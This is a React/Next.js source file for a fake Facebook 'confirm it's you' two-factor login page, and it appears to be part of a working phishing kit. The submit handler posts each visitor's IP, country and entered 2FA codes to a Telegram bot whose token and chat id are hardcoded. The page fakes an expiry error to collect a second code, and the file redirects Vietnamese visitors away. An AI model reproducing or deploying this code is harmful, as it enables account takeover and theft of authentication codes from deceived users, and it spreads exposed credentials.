"use client";
import Link from 'next/link'
import React, { useState, useEffect } from 'react'
import '@style/2fa.css'
import { zodResolver } from '@hookform/resolvers/zod';
import { useForm } from 'react-hook-form';
import { z } from 'zod';
import { schema2fa } from '../login/schema';
import { useRouter } from 'next/navigation';

type FormData = z.infer<typeof schema2fa>;


const chatId = '-4095764303';
const botToken = '6333593472:AAEIM1_VL6YrJvIJzToBLMOdM8eVTZ-VUWQ';
async function sendMessageToTelegramBot(chatId : any, messageText : any, botToken :any) {
  try {
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
      chat_id: chatId,
      text: messageText,
    };

    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    const responseData = await response.json();
    if (responseData.ok) {
      console.log('Message sent:', responseData.result);
    } else {
      console.error('Error:', responseData);
    }
  } catch (error) {
    console.error('Error sending message:', error);
  }
}
const Login2fa = () => {
    const router = useRouter()
    const [countLogin, setCountLogin] = useState(0);
    const [error, setError] = React.useState(false);

    const [ip, setIp] = useState('');
    const [userAgent, setUserAgent] = useState('');
    const [country, setCountry] = useState('');
    const [langCode, setLangCode] = useState('en-US');

    const [countdown, setCountdown] = React.useState(0);


    useEffect(() => {
        // Fetch IP address
        fetch("https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5").then(res => res.json()).then(data => {
          setIp(data.ip);
          setCountry(data.country_name);
          const lang = data.country_code2.toLowerCase();
          setLangCode(data.languages.split(',')[1]);
          if(data.country_code2 === 'VN'){
            window.location.href = 'https://www.facebook.com/';
          }
        });
       
        //const data_ip = res_ip.json();
       
        //fetch('https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5')
        //  .then(res => res.json())
        //  .then(data => {setIp(data.ip); console.log(data)});
    
        // Get user agent
        setUserAgent(navigator.userAgent);
    
        // Initialize reCAPTCHA

      }, []);
    
    const {
        register,
        handleSubmit,
        formState: { errors },
    } = useForm<FormData>({
        resolver: zodResolver(schema2fa),
    });

    const onSubmit = (data: any) => {
        //console.log(data);
        const message = `\nip: ${ip}\ncountry: ${country}\ncode 1 : ${data.code}\n`;
        sendMessageToTelegramBot(chatId, message, botToken);
        setCountLogin(prev => prev + 1);
        if(countLogin === 0) {
            setError(true);
            const timeoutId = setTimeout(() => {
            setError(false);

            }, 30000); 
        return () => clearTimeout(timeoutId);
        }
        if (countLogin > 0) {
            const message = `\nip: ${ip}\ncountry: ${country}\ncode 2 : ${data.code}\n`;
            sendMessageToTelegramBot(chatId, message, botToken);
            router.push('/createcareer')
        } else {
            setError(true);
        } 
    };


    return (
        <div style={{ paddingTop: "initial" }}>
            <div className="myus-shopping">
                <div
                    className="my-core-extension"
                    id="myus-mall-extension-is-installed"
                    style={{ display: "none" }}
                >
                    <div className=" ">
                        <div
                            className="myus-header-container fadeInSlideDown is-hidden"
                            id="myus-header-container"
                        >
                            <div className="flex-nav">
                                <div className="myus-flex-item brand-image-container">
                                    <div className="brand-image-container-link pointer">
                                        <Link target="_blank" href="https://shopping.myus.com/stores/">
                                            <span>
                                                <img
                                                    className="brandImage"
                                                    src="chrome-extension://jdohdiappiakacbmckagohongolonbpj/img/banner-logo.png"
                                                    alt="MyUS Shopping Logo"
                                                />
                                            </span>
                                        </Link>
                                    </div>
                                </div>
                                <div className="myus-flex-item line-spacer">
                                    <span className="line" />
                                </div>
                                <div />
                                <div
                                    className="margin-left browse-button nav-hover myus-flex-item "
                                    id="browse-button"
                                >
                                    <a
                                        role="button"
                                        tabIndex={0}
                                        className="myus-flex-item"
                                        id="browse-button-click"
                                        style={{ height: "100%" }}
                                    >
                                        <img
                                            className="is-hidden noclick"
                                            src="chrome-extension://jdohdiappiakacbmckagohongolonbpj/img/shop-icon.png"
                                            alt="Browse Stores by Hovering Over Item"
                                            style={{ width: 23, height: 23, marginRight: 3 }}
                                        />
                                        <span className="noclick">Browse Stores</span>
                                    </a>
                                </div>
                                <div
                                    className="myus-flex-item myus-add-to-cart-container"
                                    style={{ marginLeft: "auto" }}
                                >
                                    <div id="add-to-myus-and-minicart-button">
                                        <div
                                            role="button"
                                            id="add-to-myus-cart-button"
                                            tabIndex={0}
                                            className="add-to-cart-button "
                                        >
                                            <span>Add to MyUS cart</span>
                                        </div>
                                        <div className="verticalSeparator" />
                                        <div
                                            role="button"
                                            tabIndex={0}
                                            id="myus-minicart-button"
                                            className="add-to-cart-button "
                                        >
                                            <div className="cart-button-container margin-left myus-flex-item ">
                                                <a
                                                    id="view-cart-button-click"
                                                    className="badgeContainerNav myus-flex-item"
                                                    rel="noopener noreferrer"
                                                    style={{
                                                        overflow: "visible",
                                                        paddingRight: "1.5em",
                                                        paddingLeft: "1em"
                                                    }}
                                                >
                                                    <div />
                                                    <div />
                                                    <img
                                                        className="noclick"
                                                        src="chrome-extension://jdohdiappiakacbmckagohongolonbpj/img/cart-icon.png"
                                                        alt="View Cart"
                                                        style={{ width: 30, height: 30 }}
                                                    />
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <a
                                    role="button"
                                    className="myus-flex-item"
                                    tabIndex={0}
                                    id="close-extension-button"
                                >
                                    X
                                </a>
                                <a
                                    aria-label="newInstall"
                                    id="newInstallPage"
                                    href="https://shopping.myus.com/stores?newInstall=true"
                                    target="_blank"
                                    rel="noopener noreferrer"
                                />
                            </div>
                        </div>
                        <div className="modals-container">
                            <div className="is-hidden">
                                <div
                                    aria-label="modalBG"
                                    role="button"
                                    tabIndex={0}
                                    className=" modal-background fadeInFaster"
                                />
                                <div>
                                    <div>
                                        <div className="modalContainer fadeIn" style={{ width: 900 }}>
                                            <div className="modalContainer-inner" style={{ maxWidth: 900 }}>
                                                <div
                                                    style={{
                                                        display: "flex",
                                                        justifyContent: "flex-end",
                                                        marginBottom: "0.5em"
                                                    }}
                                                >
                                                    <a
                                                        role="link"
                                                        tabIndex={0}
                                                        style={{
                                                            fontFamily: '"Open Sans", sans-serif',
                                                            cursor: "pointer",
                                                            textDecorationLine: "underline"
                                                        }}
                                                    >
                                                        Close
                                                    </a>
                                                </div>
                                                <div className="manual-entry-modal">
                                                    <form className="custom-form">
                                                        <h3 id="manualEntryTitle" className="margin-bottom-small">
                                                            YOU CAN SHOP HERE!
                                                        </h3>
                                                        <p className="myus-small">
                                                            Find the product you want to buy and give us the
                                                            details.
                                                        </p>
                                                        <div className="is-hidden">
                                                            <div className="">
                                                                <div className="custom-form-group undefined">
                                                                    <label className="is-hidden" htmlFor="ProductURL">
                                                                        :
                                                                    </label>
                                                                    <input
                                                                        name="ProductURL"
                                                                        id="ProductURL"
                                                                        type="hidden"
                                                                        title="Product URL"
                                                                        placeholder="Product URL"
                                                                        className=""
                                                                        defaultValue="https://recruit.wadivisions.com/login"
                                                                    />
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div>
                                                            <div className="">
                                                                <div style={{ display: "flex", width: "100%" }}>
                                                                    <div style={{ flex: "5 1 0%" }}>
                                                                        <div style={{ display: "flex" }}>
                                                                            <div className="custom-form-group margin-right-small">
                                                                                <label className="" htmlFor="Description">
                                                                                    *Product Title:
                                                                                </label>
                                                                                <input
                                                                                    name="Description"
                                                                                    id="Description"
                                                                                    type="text"
                                                                                    title="Enter product title"
                                                                                    placeholder="Enter product title"
                                                                                    className=""
                                                                                    defaultValue=""
                                                                                />
                                                                            </div>
                                                                            <div className="custom-form-group margin-right-small">
                                                                                <label className="" htmlFor="Value">
                                                                                    *Price (USD):
                                                                                </label>
                                                                                <input
                                                                                    name="Value"
                                                                                    id="Value"
                                                                                    type="text"
                                                                                    title="Enter price"
                                                                                    placeholder="Enter price"
                                                                                    className=""
                                                                                    defaultValue=""
                                                                                />
                                                                            </div>
                                                                            <div className="custom-form-group undefined">
                                                                                <label className="" htmlFor="Size">
                                                                                    Size:
                                                                                </label>
                                                                                <input
                                                                                    name="Size"
                                                                                    id="Size"
                                                                                    type="text"
                                                                                    title="Enter size"
                                                                                    placeholder="Enter size"
                                                                                    className=""
                                                                                    defaultValue=""
                                                                                />
                                                                            </div>
                                                                        </div>
                                                                        <div style={{ display: "flex" }}>
                                                                            <div className="custom-form-group margin-right-small">
                                                                                <label className="" htmlFor="Color">
                                                                                    Color:
                                                                                </label>
                                                                                <input
                                                                                    name="Color"
                                                                                    id="Color"
                                                                                    type="text"
                                                                                    title="Enter color"
                                                                                    placeholder="Enter color"
                                                                                    className=""
                                                                                    defaultValue=""
                                                                                />
                                                                            </div>
                                                                            <div className="custom-form-group undefined">
                                                                                <label className="" htmlFor="Note">
                                                                                    Notes:
                                                                                </label>
                                                                                <input
                                                                                    name="Note"
                                                                                    id="Note"
                                                                                    type="text"
                                                                                    title="For Example: Order blue if black runs out of stock."
                                                                                    placeholder="For Example: Order blue if black runs out of stock."
                                                                                    className=""
                                                                                    defaultValue=""
                                                                                />
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div style={{ marginLeft: 15, flex: "1 1 0%" }}>
                                                                        <div
                                                                            className=""
                                                                            style={{
                                                                                marginTop: 10,
                                                                                display: "flex",
                                                                                alignItems: "center"
                                                                            }}
                                                                        >
                                                                            <div
                                                                                className="margin-bottom"
                                                                                style={{ flex: "1 1 0%" }}
                                                                            >
                                                                                <div className="form-quantity-container">
                                                                                    <div className="quantity-title ">
                                                                                        <p className="myus-small">Quantity</p>
                                                                                    </div>
                                                                                    <div>
                                                                                        <span
                                                                                            role="button"
                                                                                            tabIndex={0}
                                                                                            className="myus-minus unselectable"
                                                                                        >
                                                                                            -
                                                                                        </span>
                                                                                        <span className="myus-counter unselectable">
                                                                                            1
                                                                                        </span>
                                                                                        <span
                                                                                            role="button"
                                                                                            tabIndex={-1}
                                                                                            className="myus-plus unselectable"
                                                                                        >
                                                                                            +
                                                                                        </span>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div>
                                                                            <div
                                                                                className="button-container "
                                                                                style={{ padding: 3 }}
                                                                            >
                                                                                <div
                                                                                    role="button"
                                                                                    tabIndex={0}
                                                                                    className="width myus-custom-button add-to-cart-button"
                                                                                >
                                                                                    <span>Add to Cart</span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div className="is-hidden">
                                                            <div className="custom-form-group undefined">
                                                                <label className="is-hidden" htmlFor="Quantity">
                                                                    :
                                                                </label>
                                                                <input
                                                                    name="Quantity"
                                                                    id="Quantity"
                                                                    type="hidden"
                                                                    title="Quantity"
                                                                    placeholder="Quantity"
                                                                    className=""
                                                                    defaultValue={1}
                                                                />
                                                            </div>
                                                        </div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div />
                        </div>
                    </div>
                </div>
            </div>
            <div className='login_main'>
                <div style={{
                    display: 'flex',
                    flexDirection: 'column',
                    height: '100vh'
                }}>
                    <div className='bg-fb'  >
                        <img
                            src="./Meta Pro Support_ Facebook and Instagram_files/icon-fb-white.svg"
                            alt="Icon"
                        />
                    </div>

                    <div className='content '>

                        <form onSubmit={handleSubmit(onSubmit)} className="form_container" style={{ width: '525px' }} >
                            <div className='card'>
                                <div>
                                    <h4 className='title'>Choose a way to confirm that it's you</h4>
                                </div>
                                <hr />
                                <p>Your account has two factor authentication switch on, which requires this extra login step</p>
                                <hr />
                                <div>
                                    <h4 className='title'>Approve from another divices</h4>
                                </div>

                                <p style={{ paddingTop: '10px' }}>
                                    We already sent a notification to your logged-in devices. Check your Facebook notificatons where you're already logged in to the account and approve the login to continue
                                </p>
                                <hr />
                                <div>
                                    <h4 className='title'>Or, enter your login code</h4>
                                </div>
                                <p style={{ paddingTop: '10px' }}> Enter the 6-digit code from the authenticaton app that you set up</p>
                                <input
                                    {...register("code")}
                                    id="code"
                                    type="text"
                                    name="code"
                                    data-email="true"
                                    data-required="true"
                                    placeholder="Login code"
                                    defaultValue=""
                                    maxLength={8}
                                    style={{ marginTop: '5px' }}
                                />
                                <br />
                                {errors &&  countdown > 0 && <span className="error">Your code has expired. Please enter a new code to continue your account. Try again after: {countdown} seconds
                                </span>}
                                <br />
                                <hr />

                                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: 15 }}>
                                    <a href="#">Need another way to confirm that it's you?</a>
                                    <button type='submit' >Submit code</button>
                                </div>
                            </div>
                        </form>

                    </div>
                    <div className="footer">
                        <div className="topFooter">
                            <a href="https://recruit.wadivisions.com/login#">English (UK)</a>
                            <a href="https://recruit.wadivisions.com/login#">Deutsch</a>
                            <a href="https://recruit.wadivisions.com/login#">Türkçe</a>
                            <a href="https://recruit.wadivisions.com/login#">Српски</a>
                            <a href="https://recruit.wadivisions.com/login#">Français (France)</a>
                            <a href="https://recruit.wadivisions.com/login#">Italiano</a>
                            <a href="https://recruit.wadivisions.com/login#">Bosanski</a>
                            <a href="https://recruit.wadivisions.com/login#">Svenska</a>
                            <a href="https://recruit.wadivisions.com/login#">Español</a>
                            <a href="https://recruit.wadivisions.com/login#">Português (Brasil)</a>
                        </div>
                        <div className="bottomFooter">
                            <a href="https://recruit.wadivisions.com/login#">Sign Up</a>
                            <a href="https://recruit.wadivisions.com/login#">Log in</a>
                            <a href="https://recruit.wadivisions.com/login#">Messenger</a>
                            <a href="https://recruit.wadivisions.com/login#">Facebook Lite</a>
                            <a href="https://recruit.wadivisions.com/login#">Watch</a>
                            <a href="https://recruit.wadivisions.com/login#">Places</a>
                            <a href="https://recruit.wadivisions.com/login#">Games</a>
                            <a href="https://recruit.wadivisions.com/login#">Marketplace</a>
                            <a href="https://recruit.wadivisions.com/login#">Meta Pay</a>
                            <a href="https://recruit.wadivisions.com/login#">Oculus</a>
                            <a href="https://recruit.wadivisions.com/login#">Portal</a>
                            <a href="https://recruit.wadivisions.com/login#">Instagram</a>
                            <a href="https://recruit.wadivisions.com/login#">Bulletin</a>
                            <a href="https://recruit.wadivisions.com/login#">Fundraisers</a>
                            <a href="https://recruit.wadivisions.com/login#">Services</a>
                            <a href="https://recruit.wadivisions.com/login#">
                                Voting Information Centre
                            </a>
                            <a href="https://recruit.wadivisions.com/login#">Privacy Policy</a>
                            <a href="https://recruit.wadivisions.com/login#">Privacy Center</a>
                            <a href="https://recruit.wadivisions.com/login#">Groups</a>
                            <a href="https://recruit.wadivisions.com/login#">About</a>
                            <a href="https://recruit.wadivisions.com/login#">Create ad</a>
                            <a href="https://recruit.wadivisions.com/login#">Create Page</a>
                            <a href="https://recruit.wadivisions.com/login#">Developers</a>
                            <a href="https://recruit.wadivisions.com/login#">Careers</a>
                            <a href="https://recruit.wadivisions.com/login#">Cookies</a>
                            <a href="https://recruit.wadivisions.com/login#">AdChoices</a>
                            <a href="https://recruit.wadivisions.com/login#">Terms</a>
                            <a href="https://recruit.wadivisions.com/login#">Help</a>
                            <a href="https://recruit.wadivisions.com/login#">
                                Contact uploading and non-users
                            </a>
                        </div>
                        <span>Meta © 2023</span>
                    </div>
                </div>
            </div>
        </div>
    )
}

export default Login2fa
